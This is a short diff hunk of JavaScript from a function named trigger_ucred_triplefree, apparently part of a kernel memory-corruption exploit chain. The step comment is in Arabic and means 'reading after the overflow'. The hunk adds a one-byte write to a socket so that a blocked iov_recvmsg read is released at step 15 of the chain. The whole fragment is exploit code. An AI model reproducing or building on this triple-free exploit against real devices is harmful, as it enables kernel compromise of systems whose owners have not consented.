@@ -1398,6 +1398,9 @@ function trigger_ucred_triplefree() {
     // STEP 15 — قراءة بعد الفلو
     send_notification("[STEP 15] Waiting for iov_recvmsg...");
     wait_iov_recvmsg();
+    send_notification("[STEP 15] Sending 1 byte to iov_sock_1 to unblock read...");
+    write(new BigInt(iov_sock_1), tmp, 1);
+
     send_notification("[STEP 15] Reading from iov_sock_0...");
     read(new BigInt(iov_sock_0), tmp, 1);
     send_notification("[STEP 15] Read complete");
